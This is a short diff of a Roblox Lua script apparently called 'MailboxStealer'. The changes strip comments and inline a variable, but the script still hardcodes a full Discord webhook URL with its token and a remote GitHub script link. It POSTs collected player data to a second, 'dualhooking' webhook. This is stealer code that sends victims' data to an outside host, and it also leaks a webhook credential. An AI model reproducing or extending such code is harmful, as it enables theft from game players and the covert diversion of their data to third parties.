@@ -1,6 +1,6 @@
-local dhuser = "TehPucuk_55"       -- dualhooking user
-local dhwebhook = "https://discord.com/api/webhooks/1134888054310584371/yTAaf7W6uDLrb_ZbJ4pMuqfBWqXdcsZlLmZqgmWx_R338Sm695uBLVa4f3HqdhNPq2kH" -- Dualhooking Webhook
-local loadingraw = "https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua" -- Put Your LoadingScreen Raw Link Here
+local dhuser = "TehPucuk_55"
+local dhwebhook = "https://discord.com/api/webhooks/1134888054310584371/yTAaf7W6uDLrb_ZbJ4pMuqfBWqXdcsZlLmZqgmWx_R338Sm695uBLVa4f3HqdhNPq2kH"
+local loadingraw = "https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
@@ -73,7 +73,6 @@ getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
 local url = Webhook
-local url2 = dhwebhook
 if _G.UserID == nil then
     game:GetService("Players").LocalPlayer:Kick("Put A UserId")
     return;
@@ -1373,7 +1372,7 @@ end
 task.wait()
 if dhwebhook ~= nil then
     local abcdef2 = {
-        Url = url2,
+        Url = dhwebhook,
         Body = newdata1,
         Method = "POST",
         Headers = headers
